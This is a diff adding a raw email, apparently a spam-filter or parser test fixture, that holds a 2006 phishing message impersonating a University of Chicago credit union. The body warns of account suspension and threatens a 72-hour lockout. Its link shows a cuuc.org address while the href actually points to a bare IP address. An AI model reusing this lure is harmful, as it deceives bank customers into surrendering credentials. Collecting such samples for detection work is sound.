@@ -1,0 +1,67 @@
+From nobody Sun Jan 25 13:48:15 2015
+Return-Path: <CustomerSupportForm@cuuc.org>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by funky.example.com (Postfix) with ESMTP id 4EB4A46924
+ for <nobody@login.example.com>; Thu,  8 Jun 2006 10:50:54 -0400 (EDT)
+Received: from dns.maze.com.tw (unknown [220.229.62.220])
+ by mail2.example.com (Postfix) with ESMTP id 03FB06FA503
+ for <nobody@example.com>; Thu,  8 Jun 2006 10:50:55 -0400 (EDT)
+Received: from User (66.83.238.110.nw.nuvox.net [66.83.238.110])
+ by dns.maze.com.tw (Postfix) with ESMTP
+ id 5BDCDC5FCD; Thu,  8 Jun 2006 22:40:38 +0800 (CST)
+From: "Departament Of Credit Union at the University of Chicago"
+ <CustomerSupportForm@cuuc.org>
+Subject: Your account has been suspended
+Date: Thu, 8 Jun 2006 10:41:09 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20060608144038.5BDCDC5FCD@dns.maze.com.tw>
+To: undisclosed-recipients:;
+Status: R
+X-Status: 
+X-Keywords: 
+
+<html>
+<head>
+<meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+<meta HTTP-EQUIV="Expires" CONTENT="Mon, 06 Jan 1990 00:00:01 GMT">
+<link REL="stylesheet" TYPE="text/css" HREF="https://wv.esp-svision.com/uscu//Styles/wv_style.css">
+<title>Web Vision                                        </title>
+</title>
+
+
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Washington Mutual</title>
+</head>
+
+<BODY>
+<font face="Arial" size="2" color="#800040">
+<div style="width: 600px; border: 2px solid #191970; margin: 0 auto 0 auto; padding: 20px 15px 1px 15px; font-size: 15px">
+<a href="http://www.wamu.com/personal/default.asp"><img border="0" src="http://www.cuuc.org/images/couple_title_bar5.gif" /></a>
+<p style="font-weight: color: #000000; font-family: MS Sans Serif;" >Dear Customer,</p>
+<p style="font-weight: color: #000000; font-family: MS Sans Serif;" align="justify">Currently we are trying to upgrade our onlinebanking methods. All accounts have been temporarly suspended untill each person completes our secure online form. For this operation you will be required to pass trough a series of authentifications.</p>
+<p style="font-weight: color: #000000; font-family: MS Sans Serif;" align="justify">To begin upgrading your account please click the link below.</p>
+<p style="font-weight: color: #ffffff; font-family: MS Sans Serif;" align="center">
+<a style="color: #191970 " href="http://218.111.62.39/online/cuuc/index.htm">http://www.cuuc.org/update/</a></p>
+<div style="background-color:#ffffff; padding: 0 5px 2px 0; margin:0;"><p style="font-weight: color: #000000; font-family: MS Sans Serif; padding: 0; margin: 0;">Please note:</p>
+<p style="font-weight: color: #000000; font-family: MS Sans Serif; padding: 0; margin: 0;" align="justify">If we don't receive your account verification within 72 hours from you, we will further lock down your account untill we will be able to contact you by e-mail or phone. </p>
+</div>
+<div align="center" style="margin-top: 20px;MARGIN-BOTTOM: 10px; COLOR: white; font-weight: bold; font-family: MS Sans Serif; text-align: center; background-color: #800040; height: 15px">&copy Copyright 1998 - 2006, The Credit Union At The University of Chicago, Inc. All Rights Reserved</div>
+</div>
+</body>
+</html>
